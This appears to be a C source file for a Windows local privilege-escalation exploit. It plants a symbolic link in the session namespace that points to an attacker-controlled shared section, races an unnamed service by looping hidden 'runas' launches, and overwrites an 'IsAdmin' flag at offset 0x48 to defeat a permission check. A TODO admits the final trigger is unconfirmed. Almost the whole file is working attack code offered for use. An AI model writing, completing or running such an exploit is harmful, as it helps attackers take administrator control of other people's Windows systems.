#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI* _NtCreateSymbolicLinkObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
typedef NTSTATUS (NTAPI* _NtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

volatile BOOL bKeepRunning = TRUE;

DWORD WINAPI TriggerRace(LPVOID lpParam) {
    // Each ShellExecuteEx runas forces the service to map the section.
    SHELLEXECUTEINFO shi = { sizeof(shi), 0, NULL, L"runas", L"conhost.exe", L"", L"", SW_HIDE };
    while (bKeepRunning) {
        ShellExecuteEx(&shi);
        for (int i = 0; i < 50; i++) YieldProcessor();
    }
    return 0;
}

int wmain() {
    // 1. DYNAMIC SESSION DETECTION
    DWORD sessionId;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
    wchar_t linkPath[256];
    swprintf(linkPath, 256, L"\\Sessions\\%lu\\BaseNamedObjects\\TargetServiceConfig", sessionId);

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    auto NtOpenSection = (_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");

    HANDLE hLink = NULL, hSection = NULL, hMapping = NULL;
    UNICODE_STRING linkName, targetName;
    OBJECT_ATTRIBUTES objAttr;

    // 2. THE BRIDGE
    RtlInitUnicodeString(&linkName, linkPath);
    RtlInitUnicodeString(&targetName, L"\\BaseNamedObjects\\JoeyExploitSection");
    InitializeObjectAttributes(&objAttr, &linkName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &targetName);

    // 3. THE LURE (volatile section, zero-initialised)
    hSection = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, 0x1000, L"JoeyExploitSection");
    void* pSharedMemory = MapViewOfFile(hSection, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    memset(pSharedMemory, 0, 0x1000);

    // 4. THE RACE — priority on the trigger thread, not main
    HANDLE hThread = CreateThread(NULL, 0, TriggerRace, NULL, 0, NULL);
    SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);

    RtlInitUnicodeString(&targetName, L"\\BaseNamedObjects\\JoeyExploitSection");
    InitializeObjectAttributes(&objAttr, &targetName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // 5. THE HIJACK
    // WinDbg-confirmed: 'IsAdmin' flag lives at offset 0x48 in the service's
    // shared struct. Overwrite it to bypass the permission check.
    while (true) {
        if (NtOpenSection(&hMapping, SECTION_ALL_ACCESS, &objAttr) == 0) {
            *((DWORD*)pSharedMemory + (0x48 / 4)) = 0x1;
            bKeepRunning = FALSE;
            break;
        }
    }

    // 6. THE TRIGGER
    // Re-fire the elevation event so the service re-enters the code path
    // that reads the shared section. The mapped view already has our write —
    // this causes the service to act on it.
    // TODO: replace with a direct RPC/named-pipe call to the specific service
    // once its IPC mechanism is confirmed (OpenWindowStation only opens a
    // kernel object handle and sends no signal to anything).
    SHELLEXECUTEINFO retrigger = { sizeof(retrigger), SEE_MASK_NOZONECHECKS,
        NULL, L"runas", L"C:\\Windows\\System32\\conhost.exe", L"", L"", SW_HIDE };
    ShellExecuteEx(&retrigger);

    WaitForSingleObject(hThread, 1000);
    CloseHandle(hThread);
    CloseHandle(hLink);
    CloseHandle(hSection);

    return 0;
}
